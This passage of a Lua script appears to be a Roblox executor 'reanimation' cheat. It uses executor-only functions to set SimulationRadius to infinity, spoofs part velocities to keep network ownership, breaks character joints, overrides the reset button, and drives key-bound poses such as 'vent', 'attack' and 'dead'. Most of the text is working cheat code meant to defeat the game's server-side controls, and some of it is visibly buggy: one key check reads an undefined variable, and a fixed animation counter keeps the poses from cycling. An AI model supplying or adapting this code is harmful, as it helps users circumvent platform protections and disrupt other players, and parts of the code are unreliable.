	local att1 = Instance.new("Attachment", Part1)
	att1.Orientation = v3_0
	att1.Position = v3_0
	att1.Name = "att1_" .. Part1.Name
	if (alignmode == 1) or (alignmode == 2) then
    	local ape = Instance.new("AlignPosition", att0)
    	ape.ApplyAtCenterOfMass = false
    	ape.MaxForce = inf
    	ape.MaxVelocity = inf
    	ape.ReactionForceEnabled = false
    	ape.Responsiveness = 200
    	ape.Attachment1 = att1
    	ape.Attachment0 = att0
    	ape.Name = "AlignPositionRtrue"
    	ape.RigidityEnabled = true
	end
	if (alignmode == 2) or (alignmode == 3) then
    	local apd = Instance.new("AlignPosition", att0)
    	apd.ApplyAtCenterOfMass = false
    	apd.MaxForce = inf
    	apd.MaxVelocity = inf
    	apd.ReactionForceEnabled = false
    	apd.Responsiveness = 200
    	apd.Attachment1 = att1
    	apd.Attachment0 = att0
    	apd.Name = "AlignPositionRfalse"
    	apd.RigidityEnabled = false
    end
	local ao = Instance.new("AlignOrientation", att0)
	ao.MaxAngularVelocity = inf
	ao.MaxTorque = inf
	ao.PrimaryAxisOnly = false
	ao.ReactionTorqueEnabled = false
	ao.Responsiveness = 200
	ao.Attachment1 = att1
	ao.Attachment0 = att0
	ao.RigidityEnabled = false
    if netboost then
        Part0:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (Part0 and Part0.Parent) then
                Part0 = nil
            end
        end)
        spawn(function()
            if typeof(netboost) == "Vector3" then
    	        local vel = v3_0
    	        local rotvel = v3_0
            	while Part0 do
                    Part0.Velocity = vel
                    Part0.RotVelocity = rotvel
                    heartbeat:Wait()
                    if Part0 then
                        vel = Part0.Velocity
                        Part0.Velocity = netboost
                        Part0.RotVelocity = v3_0
                        stepped:Wait()
                    end
                end
        	elseif typeof(netboost) == "number" then
    	        local vel = v3_0
    	        local rotvel = v3_0
            	while Part0 do
                    Part0.Velocity = vel
                    Part0.RotVelocity = rotvel
                    heartbeat:Wait()
                    if Part0 then
                        local newvel = vel
                        local mag = newvel.Magnitude
                        if mag < idleMag then
                            newvel = v3(0, netboost, 0)
                        else
                            local multiplier = netboost / mag
                            newvel = v3(multiplier,  multiplier, multiplier)
                        end
                        vel = Part0.Velocity
                        rotvel = Part0.RotVelocity
                        Part0.Velocity = newvel
                        Part0.RotVelocity = v3_0
                        stepped:Wait()
                    end
                end
        	end
        end)
    end
end
local function respawnrequest()
    local c = lp.Character
    local ccfr = ws.CurrentCamera.CFrame
	local fc = Instance.new("Model")
	local nh = Instance.new("Humanoid", fc)
	lp.Character = fc
	nh.Health = 0
	lp.Character = c
	fc:Destroy()
    local con = nil
    local function confunc()
        con:Disconnect()
        ws.CurrentCamera.CFrame = ccfr
    end
    con = renderstepped:Connect(confunc)
end
local destroyhum = (method == 4) or (method == 5)
local breakjoints = (method == 0) or (method == 4)
local antirespawn = (method == 0) or (method == 2) or (method == 3)
addtools = addtools and gp(lp, "Backpack", "Backpack")
if simradius == "shp" then
    local shp = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
    if shp then
        spawn(function()
            while c and heartbeat:Wait() do
                shp(lp, "SimulationRadius", inf)
            end
        end)
    end
elseif simradius == "ssr" then
    local ssr = setsimulationradius or set_simulation_radius or set_sim_radius or setsimradius or set_simulation_rad or setsimulationrad
    if ssr then
        spawn(function()
            while c and heartbeat:Wait() do
                ssr(inf)
            end
        end)
    end
end
antiragdoll = antiragdoll and function(v)
    if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
        v.Parent = nil
    end
end
if antiragdoll then
    for i, v in pairs(c:GetDescendants()) do
        antiragdoll(v)
    end
    c.DescendantAdded:Connect(antiragdoll)
end
if antirespawn then
    respawnrequest()
end
if method == 0 then
	wait(loadtime)
	if not c then
	    return
	end
end
if discharscripts then
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("LocalScript") then
            v.Disabled = true
        end
    end
elseif newanimate then
    local animate = gp(c, "Animate", "LocalScript")
    if animate and (not animate.Disabled) then
        animate.Disabled = true
    else
        newanimate = false
    end
end
local hum = c:FindFirstChildOfClass("Humanoid")
if hum then
    for i, v in pairs(hum:GetPlayingAnimationTracks()) do
	    v:Stop()
    end
end
if addtools then
    for i, v in pairs(addtools:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = c
        end
    end
end
pcall(function()
    settings().Physics.AllowSleep = false
    settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
end)
local OLDscripts = {}
for i, v in pairs(c:GetDescendants()) do
	if v.ClassName == "Script" then
		table.insert(OLDscripts, v)
	end
end
local scriptNames = {}
for i, v in pairs(c:GetDescendants()) do
	if v:IsA("BasePart") then
	    local newName = tostring(i)
	    local exists = true
	    while exists do
		    exists = false
		    for i, v in pairs(OLDscripts) do
		        if v.Name == newName then
		            exists = true
		        end
		    end
		    if exists then
		        newName = newName .. "_"    
		    end
	    end
        table.insert(scriptNames, newName)
		Instance.new("Script", v).Name = newName
	end
end
c.Archivable = true
local cl = c:Clone()
for i, v in pairs(cl:GetDescendants()) do
    pcall(function()
        v.Transparency = 1
        v.Anchored = false
    end)
end
local model = Instance.new("Model", c)
model.Name = model.ClassName
model:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (model and model.Parent) then
        model = nil
    end
end)
for i, v in pairs(c:GetChildren()) do
	if v ~= model then
	    if destroyhum and v:IsA("Humanoid") then
	        v:Destroy()
	    else
	        if addtools and v:IsA("Tool") then
	            for i1, v1 in pairs(v:GetDescendants()) do
	                if v1 and v1.Parent and v1:IsA("BasePart") then
	                    local bv = Instance.new("BodyVelocity", v1)
	                    bv.Velocity = v3_0
	                    bv.MaxForce = v3(1000, 1000, 1000)
	                    bv.P = 1250
	                    bv.Name = "bv_" .. v.Name
	                end
	            end
	        end
		    v.Parent = model
	    end
	end
end
local head = gp(model, "Head", "BasePart")
local torso = gp(model, "Torso", "BasePart") or gp(model, "UpperTorso", "BasePart")
if breakjoints then
    model:BreakJoints()
else
    if head and torso then
        for i, v in pairs(model:GetDescendants()) do
            if v:IsA("Weld") or v:IsA("Snap") or v:IsA("Glue") or v:IsA("Motor") or v:IsA("Motor6D") then
                local save = false
                if (v.Part0 == torso) and (v.Part1 == head) then
                    save = true
                end
                if (v.Part0 == head) and (v.Part1 == torso) then
                    save = true
                end
                if save then
                    if hedafterneck then
                        hedafterneck = v
                    end
                else
                    v:Destroy()
                end
            end
        end
    end
    if method == 3 then
        spawn(function()
            wait(loadtime)
            if model then
                model:BreakJoints()
            end
        end)
    end
end
cl.Parent = c
for i, v in pairs(cl:GetChildren()) do
	v.Parent = c
end
cl:Destroy()
local modelDes = {}
for i, v in pairs(model:GetDescendants()) do
    if v:IsA("BasePart") then
        i = tostring(i)
        local con = nil
        con = v:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (v and v.Parent) then
                con:Disconnect()
                modelDes[i] = nil
            end
        end)
        modelDes[i] = v
    end
end
local modelcolcon = nil
local function modelcolf()
    if model then
        for i, v in pairs(modelDes) do
			v.CanCollide = false
		end
    else
        modelcolcon:Disconnect()
    end
end
modelcolcon = stepped:Connect(modelcolf)
modelcolf()
for i, scr in pairs(model:GetDescendants()) do
	if (scr.ClassName == "Script") and table.find(scriptNames, scr.Name) then
		local Part0 = scr.Parent
		if Part0:IsA("BasePart") then
			for i1, scr1 in pairs(c:GetDescendants()) do
				if (scr1.ClassName == "Script") and (scr1.Name == scr.Name) and (not scr1:IsDescendantOf(model)) then
					local Part1 = scr1.Parent
					if (Part1.ClassName == Part0.ClassName) and (Part1.Name == Part0.Name) then
						align(Part0, Part1)
						break
					end
				end
			end
		end
	end
end
if (typeof(hedafterneck) == "Instance") and head and head.Parent then
    local aligns = {}
    for i, v in pairs(head:GetDescendants()) do
        if v:IsA("AlignPosition") or v:IsA("AlignOrientation") then
            table.insert(aligns, v)
            v.Enabled = false
        end
    end
    spawn(function()
        while c and hedafterneck and hedafterneck.Parent do
            stepped:Wait()
        end
        if not (c and head and head.Parent) then
            return
        end
        for i, v in pairs(aligns) do
            pcall(function()
                v.Enabled = true
            end)
        end
    end)
end
for i, v in pairs(c:GetDescendants()) do
	if v and v.Parent then
		if v.ClassName == "Script" then
			if table.find(scriptNames, v.Name) then
				v:Destroy()
			end
		elseif not v:IsDescendantOf(model) then
			if v:IsA("Decal") then
			    v.Transparency = 1
			elseif v:IsA("ForceField") then
			    v.Visible = false
			elseif v:IsA("Sound") then
			    v.Playing = false
			elseif v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
				v.Enabled = false
			end
		end
	end
end
if newanimate then
    local animate = gp(c, "Animate", "LocalScript")
    if animate then
        animate.Disabled = false
    end
end
if addtools then
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = addtools
        end
    end
end
local hum0 = model:FindFirstChildOfClass("Humanoid")
local hum1 = c:FindFirstChildOfClass("Humanoid")
if hum1 then
    ws.CurrentCamera.CameraSubject = hum1
    local camSubCon = nil
    local function camSubFunc()
        camSubCon:Disconnect()
        if c and hum1 and (hum1.Parent == c) then
            ws.CurrentCamera.CameraSubject = hum1
        end
    end
    camSubCon = renderstepped:Connect(camSubFunc)
	if hum0 then
		hum0.Changed:Connect(function(prop)
			if (prop == "Jump") and hum1 and hum1.Parent then
				hum1.Jump = hum0.Jump
			end
		end)
	else
	    lp.Character = nil
	    lp.Character = c
	end
end
local rb = Instance.new("BindableEvent", c)
rb.Event:Connect(function()
	rb:Destroy()
	sg:SetCore("ResetButtonCallback", true)
	if destroyhum then
	    c:BreakJoints()
	    return
	end
	if antirespawn then
	    if hum0 and hum0.Parent and (hum0.Health > 0) then
	        model:BreakJoints()
	        hum0.Health = 0
	    end
		respawnrequest()
	else
	    if hum0 and hum0.Parent and (hum0.Health > 0) then
	        model:BreakJoints()
	        hum0.Health = 0
	    end
	end
end)
sg:SetCore("ResetButtonCallback", rb)
spawn(function()
	while c do
		if hum0 and hum0.Parent and hum1 and hum1.Parent then
            hum1.Jump = hum0.Jump
        end
		wait()
	end
	sg:SetCore("ResetButtonCallback", true)
end)
R15toR6 = R15toR6 and hum1 and (hum1.RigType == Enum.HumanoidRigType.R15)
if R15toR6 then
	local cfr = nil
	pcall(function()
		cfr = gp(c, "HumanoidRootPart", "BasePart").CFrame
	end)
	if cfr then
		local R6parts = { 
			head = {
				Name = "Head",
				Size = v3(2, 1, 1),
				R15 = {
					Head = 0
				}
			},
			torso = {
				Name = "Torso",
				Size = v3(2, 2, 1),
				R15 = {
					UpperTorso = 0.2,
					LowerTorso = -0.8
				}
			},
			root = {
				Name = "HumanoidRootPart",
				Size = v3(2, 2, 1),
				R15 = {
					HumanoidRootPart = 0
				}
			},
			leftArm = {
				Name = "Left Arm",
				Size = v3(1, 2, 1),
				R15 = {
					LeftHand = -0.85,
					LeftLowerArm = -0.2,
					LeftUpperArm = 0.4
				}
			},
			rightArm = {
				Name = "Right Arm",
				Size = v3(1, 2, 1),
				R15 = {
					RightHand = -0.85,
					RightLowerArm = -0.2,
					RightUpperArm = 0.4
				}
			},
			leftLeg = {
				Name = "Left Leg",
				Size = v3(1, 2, 1),
				R15 = {
					LeftFoot = -0.85,
					LeftLowerLeg = -0.15,
					LeftUpperLeg = 0.6
				}
			},
			rightLeg = {
				Name = "Right Leg",
				Size = v3(1, 2, 1),
				R15 = {
					RightFoot = -0.85,
					RightLowerLeg = -0.15,
					RightUpperLeg = 0.6
				}
			}
		}
		for i, v in pairs(c:GetChildren()) do
			if v:IsA("BasePart") then
				for i1, v1 in pairs(v:GetChildren()) do
					if v1:IsA("Motor6D") then
						v1.Part0 = nil
					end
				end
			end
		end
		for i, v in pairs(R6parts) do
			local part = Instance.new("Part")
			part.Name = v.Name
			part.Size = v.Size
			part.CFrame = cfr
			part.Anchored = false
			part.Transparency = 1
			part.CanCollide = false
			for i1, v1 in pairs(v.R15) do
				local R15part = gp(c, i1, "BasePart")
				local att = gp(R15part, "att1_" .. i1, "Attachment")
				if R15part then
					local weld = Instance.new("Weld", R15part)
					weld.Name = "Weld_" .. i1
					weld.Part0 = part
					weld.Part1 = R15part
					weld.C0 = cf(0, v1, 0)
					weld.C1 = cf(0, 0, 0)
					R15part.Massless = true
					R15part.Name = "R15_" .. i1
					R15part.Parent = part
				    if att then
				        att.Parent = part
				        att.Position = v3(0, v1, 0)
				    end
				end
			end
			part.Parent = c
			R6parts[i] = part
		end
		local R6joints = {
			neck = {
				Parent = R6parts.torso,
				Name = "Neck",
				Part0 = R6parts.torso,
				Part1 = R6parts.head,
				C0 = cf(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
				C1 = cf(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			},
			rootJoint = {
				Parent = R6parts.root,
				Name = "RootJoint" ,
				Part0 = R6parts.root,
				Part1 = R6parts.torso,
				C0 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
				C1 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			},
			rightShoulder = {
				Parent = R6parts.torso,
				Name = "Right Shoulder",
				Part0 = R6parts.torso,
				Part1 = R6parts.rightArm,
				C0 = cf(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
				C1 = cf(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			},
			leftShoulder = {
				Parent = R6parts.torso,
				Name = "Left Shoulder",
				Part0 = R6parts.torso,
				Part1 = R6parts.leftArm,
				C0 = cf(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
				C1 = cf(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			},
			rightHip = {
				Parent = R6parts.torso,
				Name = "Right Hip",
				Part0 = R6parts.torso,
				Part1 = R6parts.rightLeg,
				C0 = cf(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
				C1 = cf(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			},
			leftHip = {
				Parent = R6parts.torso,
				Name = "Left Hip" ,
				Part0 = R6parts.torso,
				Part1 = R6parts.leftLeg,
				C0 = cf(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
				C1 = cf(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			}
		}
		for i, v in pairs(R6joints) do
			local joint = Instance.new("Motor6D")
			for prop, val in pairs(v) do
				joint[prop] = val
			end
			R6joints[i] = joint
		end
		hum1.RigType = Enum.HumanoidRigType.R6
		hum1.HipHeight = 0
	end
end
wait()
if not c then
    return
end
local venttoggle = false
local vented = false
local mode2 = false
local attack = false
local modetoggle = false
local dead = false
local dtoggle = false
local sittoggle = false
local sit = false
local sine = 0
local mouse = lp:GetMouse()
local joints = {
    ["RootJoint"] = "",
    ["Neck"] = "",
    ["Right Hip"] = "",
    ["Left Hip"] = "",
    ["Left Shoulder"] = "",
    ["Right Shoulder"] = ""
}
for i, v in pairs(c:GetDescendants()) do
    if v:IsA("Motor6D") and (joints[v.Name] == "") and (not v:IsDescendantOf(model)) then
        joints[v.Name] = v
    end
end
for i, v in pairs(joints) do
    if v and (v ~= "") then
        v.C0 = cf(0, 0, 0)
        v.C1 = cf(0, 0, 0)
    else
        return
    end
end
local Root = gp(c, "HumanoidRootPart", "BasePart")
if not Root then
    return
end
local function replace(a)
    local b, c = a.Part0, a.Part1
    a.Part1, a.Part0 = b, c
end
replace(joints["Left Shoulder"])
replace(joints["Right Shoulder"])
replace(joints["Left Hip"])
replace(joints["Right Hip"])
for i, v in pairs(c:GetChildren()) do
    if v:IsA("Accessory") then
        v:Destroy()
    end
end
joints.Neck.C0 = cf(0, 0.3, -0.5)
mouse.Button1Down:Connect(function()
    if not (kill or mode2 or dead) then
        attack = true
        vented = false
        hum1.WalkSpeed = 0
        wait(0.5)
        hum1.WalkSpeed = 16
        attack = false
    end
end)
mouse.KeyDown:Connect(function(key)
    if not c then 
        return 
    end
    key = key:lower()
    if k == "e" then
        if not venttoggle then
            modetoggle = false
            mode2 = false
            venttoggle = true
            vented = true
            hum1.WalkSpeed = 100
            position = "ventidle"
        elseif venttoggle then
            venttoggle = false
            vented = false
            hum1.WalkSpeed = 16
        end
    elseif key == "f" then
        if not modetoggle then
            venttoggle = false
            vented = false
            modetoggle = true
            mode2 = true
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 60
        elseif modetoggle then
            modetoggle = false
            mode2 = false
            hum1.WalkSpeed = 16
        end
    elseif key == "q" then
        if dtoggle == false then
            venttoggle = false
            vented = false
            modetoggle = false
            mode2 = false
            dtoggle = true
            dead = true
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 0
        elseif dtoggle == true then
            dtoggle = false
            dead = false
            hum1.WalkSpeed = 16
        end
    elseif key == "c" then
        if sittoggle == false then
            venttoggle = false
            vented = false
            modetoggle = false
            mode2 = false
            dtoggle = false
            dead = false
            sittoggle = true
            sit = true
            hum1.WalkSpeed = 0
        elseif sittoggle == true then
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 16
        end
    end
end)
local pose = "idle"
while stepped:Wait() and c do
    if attack then
        pose = "attack"
    elseif dead then
        pose = "dead"
    elseif sit then
        pose = "sit"
    elseif mode2 then
        if Root.Velocity.Magnitude < 2 then
            pose = "idle2"
        elseif Root.Velocity.Magnitude > 20 then
            pose = "walk2"
        end
    else
        if Root.Velocity.y > 1 then
            pose = "jump"
        elseif Root.Velocity.y < -1 then
            pose = "fall"
        elseif Root.Velocity.Magnitude < 2 then
            pose = "idle"
        elseif Root.Velocity.Magnitude < 20 then
            pose = "walk"
        elseif Root.Velocity.Magnitude > 20 then
            pose = "run"
        end 
    end
    sine = 1
    if pose == "idle" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0.3 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(20 + 0 * math.sin(sine/12)), math.rad(-3 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(-20 + 0 * math.sin(sine/12)), math.rad(3 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "walk" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0.3 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0.3 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 30 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + -0.3 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + -30 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "jump" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(15 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "fall" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(15 + 10 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-10 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(10 + 5 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(10 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "vent" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + -8 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 1.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "ventidle" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), -20 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 1.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "idle2" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/20), 3 + 0.3 * math.sin(sine/20), 0 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + 20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(20 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/20), 2 + 0 * math.sin(sine/20), 0.5 + -0.5 * math.sin(sine/20)) * CFrame.Angles(math.rad(10 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
    elseif pose == "walk2" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/20), 3 + 0.3 * math.sin(sine/20), 0 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(-60 + 10 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/20), 2 + 0 * math.sin(sine/20), 0.3 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + -10 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(-5 + 0 * math.sin(sine/20))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20), 0.5 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(5 + 0 * math.sin(sine/20))),0.1)
    elseif pose == "attack" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(4 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "sit" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), -1.8 + 0 * math.sin(sine/5), 0 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(10 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), -1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/12)), math.rad(10 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), -1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/12)), math.rad(-10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "dead" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/5), -2.5 + 0 * math.sin(sine/5), -1 + 0 * math.sin(sine/5)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5)), math.rad(0 + 0 * math.sin(sine/5))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 3 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-4 + 0 * math.sin(sine/12))),0.1)
